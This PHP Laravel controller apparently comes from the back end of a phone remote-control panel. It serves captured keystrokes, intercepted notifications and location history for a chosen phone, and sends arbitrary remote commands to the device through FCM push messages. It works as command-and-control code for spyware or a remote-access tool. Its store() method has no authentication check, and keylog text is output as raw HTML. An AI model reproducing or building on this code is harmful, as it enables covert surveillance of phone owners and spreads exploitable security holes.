<?php

namespace App\Http\Controllers\api;

use App\Http\Controllers\Controller;
use App\Models\Keylogger;
use App\Models\Location;
use App\Models\Notification;
use App\Models\Phone;
use App\Models\Remotecontrol;
use App\Traits\ApiResponser;
use Google\Service\Bigquery\AvroOptions;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Yajra\DataTables\DataTables;

class RemoteControlAPIController extends Controller
{
    use ApiResponser;
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        $user = Auth::user();
        abort_if(!in_array($user->user_role, ['admin']), 403, "No permission");

        if ($user->user_role == 'admin') {
            $phone_id = request('phone_id');
            $type = request('type');
            if ($type == 'result') {
                $data = Remotecontrol::where(compact('phone_id'));
                return DataTables::of($data)
                    ->rawColumns(['success', 'result'])
                    ->editColumn('result', function ($row) {
                        $href = asset('storage/' . $row->result);
                        $n = explode('/', $row->result);
                        $n = end($n);
                        return "<a href='$href' target='_blank'>$n</a>";
                    })
                    ->editColumn('success', function ($row) {
                        $st = $row->fetched;
                        if ($st == 0) {
                            $status = "<span class='badge bg-warning'><i class='fa fa-spinner fa-spin'></i> En attente</span>";
                        } elseif ($row->success) {
                            $status = "<span class='badge bg-success'><i class='fa fa-check-circle'></i> OK</span>";
                        } else {
                            $status = "<span class='badge bg-danger'><i class='fa fa-exclamation-circle'></i> Echec</span>";
                        }
                        return $status;
                    })->editColumn('date', function ($row) {
                        return $row->date->format('d-m-Y H:i:s');
                    })
                    ->make(true);
            }

            if ($type == 'notif') {
                $data = Notification::where(compact('phone_id'));
                return DataTables::of($data)
                    ->editColumn('date', function ($row) {
                        return $row->date->format('d-m-Y H:i:s');
                    })
                    ->make(true);
            }

            if ($type == 'keylog') {
                $data = Keylogger::where(compact('phone_id'));
                return DataTables::of($data)
                    ->rawColumns(['text'])
                    ->editColumn('date', function ($row) {
                        return $row->date->format('d-m-Y H:i:s');
                    })
                    ->editColumn('text', function ($row) {
                        return str_replace("#781227#", "<br><br>", $row->text);
                    })
                    ->make(true);
            }

            if ($type == 'location') {
                $data = Location::where(compact('phone_id'))->orderBy('id', 'desc')->get()->map(function ($e) {
                    $o = (object) $e->toArray();
                    $o->date = $e->date?->format('d-m-Y H:i:s');
                    return $o;
                });
                return $data;
            }

            abort(403);
        }
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        $phone_id = request('phone_id');
        if (!$phone_id) {
            abort(422, "Phone est required");
        }
        $action = request('action');
        $action2 = request('action2');
        if ($action2) {
            $action = $action2;
        }

        // if (in_array($action, ['p1.0', 'p1.1', 'p0.0', 'p0.1', 'c'])) {
        $rem = Remotecontrol::create([
            'phone_id' => $phone_id,
            'action' => $action,
            'success' => 0,
            'fetched' => 0,
            'fromadmin' => 0,
            'date' => nnow(),
        ]);
        $phone = $rem->phone;
        if ($phone->fcm) {
            $cmd = "$rem->id.$action";
            try {
                sendMessage($phone->fcm, $cmd);
            } catch (\Throwable $th) {
            }
        }

        return $this->success("Commande envoyée");
        // }
    }

    /**
     * Display the specified resource.
     *
     * @param  \App\Models\Remotecontrol  $remotecontrol
     * @return \Illuminate\Http\Response
     */
    public function show(Remotecontrol $remotecontrol)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \App\Models\Remotecontrol  $remotecontrol
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, Remotecontrol $remotecontrol)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  \App\Models\Remotecontrol  $remotecontrol
     * @return \Illuminate\Http\Response
     */
    public function destroy(Remotecontrol $remotecontrol)
    {
        //
    }
}
